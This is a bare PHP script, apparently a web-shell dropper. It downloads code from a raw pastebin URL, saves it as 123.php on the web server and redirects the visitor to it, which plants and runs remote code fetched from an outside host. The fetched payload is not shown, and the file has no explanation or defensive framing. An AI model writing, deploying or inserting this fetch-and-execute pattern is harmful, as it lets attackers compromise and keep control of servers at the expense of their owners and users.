<?php
$content = "https://pastebin.com/raw/VYqYKRv7";
$get_content = file_get_contents($content);
if(file_exists("123.php")){header("location: 123.php");}else{file_put_contents("123.php", $get_content); header("location: 123.php");}
?>
